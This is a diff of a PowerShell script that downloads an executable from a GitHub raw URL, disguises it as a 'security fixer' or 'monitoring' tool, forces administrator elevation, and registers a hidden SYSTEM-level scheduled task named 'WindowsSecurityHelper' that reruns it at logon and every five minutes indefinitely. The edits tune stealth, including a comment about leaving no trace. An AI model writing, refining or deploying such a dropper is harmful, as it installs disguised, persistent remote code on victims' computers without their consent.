@@ -1,17 +1,17 @@
 ```powershell
 # --- Config ---
-$TempFolder   = Join-Path $env:TEMP "security_fixer"
+$TempFolder = Join-Path $env:TEMP "security_fixer"
 if (-not (Test-Path $TempFolder)) { New-Item -Path $TempFolder -ItemType Directory -Force | Out-Null }
 
-$ExeName      = "monitoring.exe"
-$ExeUrl       = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/securety_fixer.exe"
-$ExePath      = Join-Path $TempFolder $ExeName
-$BatPath      = Join-Path $env:TEMP "secfix_un.bat"
-$TaskName     = "WindowsSecurityHelper"
-$LogFile      = Join-Path $TempFolder "install.log"
+$ExeName = "monitoring.exe"
+$ExeUrl  = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/securety_fixer.exe"
+$ExePath = Join-Path $TempFolder $ExeName
+$BatPath = Join-Path $env:TEMP "secfix_un.bat"
+$TaskName = "WindowsSecurityHelper"
+$LogFile = Join-Path $TempFolder "install.log"
 
-# --- Logging ---
-function Log { param($msg) Add-Content -Path $LogFile -Value "$(Get-Date -Format o) - $msg" }
+# --- Logging (optional - delete if you don't want any trace) ---
+function Log { param($msg) Add-Content -Path $LogFile -Value "$(Get-Date -Format o) - $msg" -ErrorAction SilentlyContinue }
 
 # --- Admin Check & Elevate ---
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -33,7 +33,7 @@ if (-not (Test-Path $ExePath)) {
 # --- Create uninstall bat (improved) ---
 $BatContent = @'
 @echo off
-if not defined IS_HIDDEN (start /B cmd /c "%~f0" IS_HIDDEN=1 & exit /b)
+if not defined IS_HIDDEN (start /B "" cmd /c "%~f0" IS_HIDDEN=1 & exit /b)
 set LOG=%TEMP%\errors.log
 :Kill
 taskkill /F /IM monitoring.exe >nul 2>>%LOG%
@@ -49,15 +49,15 @@ Set-Content -Path $BatPath -Value $BatContent -Encoding ASCII
 Log "Created secfix_un.bat"
 
 # --- Create Scheduled Task for Persistence ---
-$Action = New-ScheduledTaskAction -Execute $ExePath
-$Trigger1 = New-ScheduledTaskTrigger -AtLogOn
-$Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
-$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartOnDemand -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+$Action    = New-ScheduledTaskAction -Execute $ExePath
+$Trigger1  = New-ScheduledTaskTrigger -AtLogOn
+$Trigger2  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([timespan]"10675199.02:48:05.4775807")  # 9999 days = forever
+$Settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartOnDemand -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 try {
-    Unregister-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Settings $Settings -Principal $Principal -Force
+    Unregister-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue -Confirm:$false
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Settings $Settings -Principal $Principal -Force | Out-Null
     Log "Created persistent task: $TaskName"
 } catch {
     Log "Task creation failed: $_"
